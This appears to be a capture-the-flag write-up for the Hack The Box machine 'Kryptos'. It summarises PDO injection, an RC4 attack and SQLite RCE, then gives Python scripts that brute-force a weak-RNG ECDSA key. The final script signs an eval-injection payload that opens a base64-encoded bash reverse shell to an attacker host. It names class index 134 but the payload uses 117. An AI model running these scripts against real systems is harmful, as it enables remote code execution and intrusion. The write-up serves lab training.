# Kryptos (PDO Injection, SQLite3 RCE, Python Eval Injection)

KryptOS is an insane difficulty Linux box which requires knowledge of how cryptographic
algorithms work. A login page is found to be vulnerable to PDO injection, and can be hijacked to
gain access to the encrypting page. The page uses RC4 to encrypt files, which can be subjected
to a known plaintext attack. This can be used to abuse a SQL injection in an internal web
application to dump code into a file, and execute it to gain a shell. A `Vimcrypt` file is found, which
uses a broken algorithm and can be decrypted. A vulnerable python app running on the local
host is found using a weak RNG (Random Number Generator) which can be brute forced to gain
RCE via the `eval` function.

# Skills Learned:

- PDO Injection
- Exploiting RC4 flaws
- RCE via SQLite3
- Decrypting Vimcrypt files
- Analysing RNG
- Python eval injection

# Problems I Ran Into

1. Priv Esc (Python eval injection)
    - Following the official walkthrough by HTB, there is a `[brute.py](http://brute.py)` script that you have to run to test if the server is vulnerable and to the get the signature being used
    - The script given in the walkthrough gave me problems so I had to tweak it a bit. Here is the script I used:
    
    ```python
    #!/usr/bin/python
    import requests
    import json
    import hashlib
    import binascii
    from ecdsa import VerifyingKey, SigningKey, NIST384p
    url = 'http://127.0.0.1:81/eval'
    uniq_vals = open("uniq.txt").readlines() # uniq.txt is the list of unique values found from rng.py
    expr = "900 + 1"
    def sign(msg, sk):
    	return binascii.hexlify(sk.sign(msg))
    
    for rand in uniq_vals:
    	sk = SigningKey.from_secret_exponent(int(rand), curve=NIST384p)
    	sig = sign(expr, sk)
    	data = { "expr" : expr , "sig" : sig }
    	res = requests.post( url, json = data )
    	print res.text
    	if "Bad" not in res.text:
    		print "Found signature {}".format(sig)
    		print res.text
    		print "Rand: {}".format(rand) # the unique value from uniq.txt
    		print "KEEP NOTE OF THE RAND"
    		break
    ```
    
    - After I found the signature and uniq rand, I tweaked the script again, but after I found where the `os` class is located in python
    - To find the `os` class do the following:
        - open python interpreter in the command line
        
        ```python
        >>> count = 0
        >>> for i in [].__class__.__base__.__subclasses__():
        ...    print(count)
        ...    count += 1
        ...    print(i)
        ...
        
        ```
        
        - `<class 'os.wrap_close'>` is found to be number 134
    ![os Class](https://scriptkiddiehub.com/wp-content/uploads/2021/10/kryptos.png)
    - Set up your nc listener and run the following tweaked `brute.py`
    - Now here is the tweaked `[brute.py](http://brute.py)` :
    
    ```python
    #!/usr/bin/python
    import requests
    import json
    import hashlib
    import binascii
    from ecdsa import VerifyingKey, SigningKey, NIST384p
    url = 'http://127.0.0.1:81/eval'
    uniq_vals = open("uniq.txt").readlines()
    expr = "[].__class__.__base__.__subclasses__().__getitem__(117).__init__.__globals__['system']('echo YmFzaCAtaSA+JiAvZGV2L3RjcC88QVRUQUNLRVIgSVA+LzEyMzQgMD4mMQ== | base64 -d | bash')"
    
    def sign(msg, sk):
    	return binascii.hexlify(sk.sign(msg))
    
    rand = 59763658961195455702488250327064726633945798537104807246171656262148712073505
    sk = SigningKey.from_secret_exponent(int(rand), curve=NIST384p)
    sig = sign(expr, sk)
    data = { "expr" : expr , "sig" : sig }
    res = requests.post( url, json = data )
    
    if "Bad" not in res.text:
    	print "Found signature {}".format(sig)
    	print res.text
    ```